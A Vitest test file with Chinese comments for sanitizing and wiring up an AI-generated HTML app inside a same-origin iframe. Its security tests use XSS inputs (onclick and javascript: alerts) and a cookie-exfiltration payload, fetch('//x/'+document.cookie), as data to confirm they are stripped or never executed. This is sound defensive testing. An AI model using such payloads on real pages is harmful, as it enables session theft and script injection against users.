// @vitest-environment jsdom
/**
 * 可操作的应用面：菜单能切、数据填得进去、点得动、游标够得着。
 *
 * ## 这组存在的理由
 *
 * 08-14 第一版做成了沙箱 iframe（不透明源）。样式对了，但把这条链路存在的
 * 理由一起解决掉了——宿主碰不到框内 DOM，于是填数/点击/游标/切页**四件事
 * 一件都做不了**。用户原话：「偏离了初衷，不是只生成页面，是操作跟以前一样」。
 *
 * 所以这里每一条都对着那四件事里的一件，外加安全边界那两条
 * （脚本必须被摘、配色必须是"读出来"而不是"执行出来"）。
 */

import { existsSync, readFileSync } from "node:fs";
import { resolve } from "node:path";

import { describe, expect, it } from "vitest";

import {
  extractPalette,
  sanitizeAppHtml,
  HTML_APP_SURFACE_VERSION,
} from "../html-app-surface";
import { deriveBindingSource } from "../derive-binding-source";
import { BINDING_ATTRS } from "../html-binding-runtime";

const PAGE = `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8">
<script src="https://cdn.tailwindcss.com"></script>
<script>
  tailwind.config = { theme: { extend: { colors: {
    brand: { 50: '#effcf8', 500: '#13b58c', 700: '#087f64' },
    ink: '#172b4d',
    muted: '#6b7a90'
  } } } };
</script>
<style>.x{color:red}</style>
</head><body class="bg-slate-50">
<aside><nav>
  <a data-page-id="p1" aria-current="page">预约挂号</a>
  <a data-page-id="p2">宠物档案</a>
</nav></aside>
<table><thead data-head="pet"><tr><th data-col>列</th></tr></thead>
<tbody data-rows="pet"><tr><td data-cell>格</td>
<td><button data-action="editRecord" data-entity="pet">改</button></td></tr></tbody></table>
</body></html>`;

describe("安全边界还是 DOMPurify —— 同源不等于放开", () => {
  it("页面自带的 script 一个不留", () => {
    /**
     * ⚠ 框是**同源**的（要 contentDocument 才能填数/点击/游标）。
     * 所以页面里的脚本必须在写进去**之前**就没了——那才是边界，
     * 不是 sandbox 属性。
     */
    const out = sanitizeAppHtml(PAGE);
    expect(out).not.toContain("<script");
    expect(out).not.toContain("cdn.tailwindcss.com");
    expect(out).not.toContain("tailwind.config");
  });

  it("on* 与 javascript: 照样摘", () => {
    const out = sanitizeAppHtml(
      '<html><body><button onclick="alert(1)">点</button><a href="javascript:alert(1)">链</a></body></html>'
    );
    expect(out).not.toContain("onclick");
    expect(out).not.toContain("javascript:");
    expect(out).toContain("点");
  });

  it("整份文档的骨架留着 —— WHOLE_DOCUMENT 不开的话 style/meta 会散架", () => {
    // 08-14 那版"一堆裸文字"的另一半原因就是 html/head/body 被拆了。
    const out = sanitizeAppHtml(PAGE);
    expect(out).toContain("<head");
    expect(out).toContain("<body");
    expect(out).toContain(".x{color:red}");
  });

  it("消毒不了就返回空串，不是原样放行", () => {
    expect(sanitizeAppHtml.toString()).toContain('typeof purify.sanitize !== "function"');
    expect(sanitizeAppHtml.toString()).toContain('return ""');
  });
});

describe("配色是读出来的，不是执行出来的", () => {
  it("嵌套色阶读得出", () => {
    const p = extractPalette(PAGE);
    expect(p.brand).toEqual({ "50": "#effcf8", "500": "#13b58c", "700": "#087f64" });
  });

  it("平铺色也读得出", () => {
    const p = extractPalette(PAGE);
    expect(p.ink).toBe("#172b4d");
    expect(p.muted).toBe("#6b7a90");
  });

  it("读不出来就返回空 —— 宁可没配色也不执行模型写的 JS", () => {
    /**
     * ⚠ 这是这一层最关键的一条。框是同源的，在里面 eval 一段模型写的脚本
     * 等于让生成内容碰到父页面（话题文字可以承载提示注入）。
     * 降级的代价只是品牌色掉回默认，版式照样对。
     */
    expect(extractPalette("<html><body>没有配置</body></html>")).toEqual({});
  });

  it("配置里夹了函数调用也不会被执行 —— 只挑 #hex 出来", () => {
    const evil = `<script>tailwind.config = { theme: { extend: { colors: {
      brand: { 500: '#13b58c' },
      evil: fetch('//x/'+document.cookie)
    } } } };</script>`;
    const p = extractPalette(evil);
    expect(p.brand).toEqual({ "500": "#13b58c" });
    expect(p.evil).toBeUndefined();
  });
});

describe("四件事各自的接线点都在", () => {
  // 判据钉在源码上：这四条断了都**不会有用例变红**——页面照常渲染，
  // 只是数据没填/点了没反应/游标空白/菜单切不动。
  //
  // ⚠ cwd 可能是仓根也可能是 client/（vitest 的 root 是 client，而
  //   process.cwd() 是仓根），两个候选都试，别赌其中一个。
  const rel = "src/pages/sliderule/live-runtime/html-app-surface.tsx";
  const found = [`client/${rel}`, rel]
    .map(c => resolve(process.cwd(), c))
    .find(c => existsSync(c))!;
  const src = readFileSync(found, "utf8");

  it("① 填数：applyBindings 打在 contentDocument 上", () => {
    expect(src).toContain("frame.contentDocument");
    expect(src).toContain("applyBindings(d.body");
  });

  it("② 点击：动作回调接出去", () => {
    expect(src).toMatch(/onAction:\s*e\s*=>\s*cbs\.current\.onAction/);
  });

  it("③ 切页：认 data-page-id，不认标签文字", () => {
    expect(src).toContain('closest?.("[data-page-id]")');
    // 反向：不许退回按文字匹配
    expect(src).not.toMatch(/textContent\s*===/);
  });

  it("④ 游标：hover 报出带绑定的元素", () => {
    expect(src).toContain("onHoverBinding");
    expect(src).toContain("mouseover");
  });

  it("⚠ iframe 不许有 sandbox —— 有了就回到「能看不能用」", () => {
    /**
     * 这条是这次返工的核心。sandbox 会让 contentDocument 变成不透明源，
     * 上面四条**全部**静默失效：页面照常渲染，只是什么都点不动。
     */
    expect(src).not.toMatch(/<iframe[\s\S]*?sandbox=/);
  });

  it("data-page-id 在消毒白名单里 —— 漏了菜单点不动且不报错", () => {
    expect(sanitizeAppHtml(PAGE)).toContain('data-page-id="p2"');
  });

  it("绑定词汇一个不漏地过消毒", () => {
    for (const attr of BINDING_ATTRS) {
      expect(sanitizeAppHtml(`<html><body><div ${attr}="x">格</div></body></html>`)).toContain(attr);
    }
  });
});

describe("数据源产出", () => {
  const MODEL = {
    datamodel: {
      entities: [
        {
          id: "pet",
          name: "宠物",
          fields: [
            { id: "name", name: "名字", type: "string" },
            { id: "status", name: "状态", type: "enum",
              options: [{ id: "in_care", label: "住院中" }, { id: "done", label: "已出院" }] },
          ],
        },
      ],
    },
  } as never;

  const RUNTIME = {
    entities: {
      pet: [
        { id: "r1", values: { name: "豆包", status: "in_care" }, createdAt: "" },
        { id: "r2", values: { name: "团团", status: "done" }, createdAt: "" },
      ],
    },
    instances: [],
    seq: 2,
  } as never;

  it("行要摊平 —— RuntimeRow 是 {id, values}，解释器按 row[fieldId] 取", () => {
    /**
     * ⚠ 不摊平的话每个格子都取到 undefined，页面填出一片「—」，
     * 而 problems 是空的（孔都认得出，只是值没有）——又一个不报错的失效。
     */
    const src = deriveBindingSource(MODEL, RUNTIME);
    expect(src.rows.pet[0]).toEqual({ id: "r1", name: "豆包", status: "in_care" });
  });

  it("字段清单照模型，enum 取值原样带过去", () => {
    const src = deriveBindingSource(MODEL, RUNTIME);
    expect(src.fields.pet.map(f => f.id)).toEqual(["name", "status"]);
    expect(src.fields.pet[1].options).toEqual([
      { id: "in_care", label: "住院中" },
      { id: "done", label: "已出院" },
    ]);
  });

  it("options 键名不做转换 —— 转一次就有两份词汇", () => {
    // `{value,label}` 那个 bug（enum 恒显内部 id）就是这么来的
    const src = deriveBindingSource(MODEL, RUNTIME);
    expect(Object.keys(src.fields.pet[1].options![0])).toEqual(["id", "label"]);
  });

  it("没有运行时数据时实体仍在，只是零行 —— 不编数据", () => {
    const src = deriveBindingSource(MODEL, null);
    expect(src.fields.pet).toHaveLength(2);
    expect(src.rows.pet).toEqual([]);
  });

  it("模型缺席返回空源 —— 让解释器如实报 problems", () => {
    // 页面引用了不存在的实体是模型的问题，不该被一份假数据盖住
    expect(deriveBindingSource(null, RUNTIME)).toEqual({ rows: {}, fields: {} });
  });
});

describe("版本号在", () => {
  it("有版本号，便于日志对齐", () => {
    expect(HTML_APP_SURFACE_VERSION).toBe("html-app-surface-v1");
  });
});
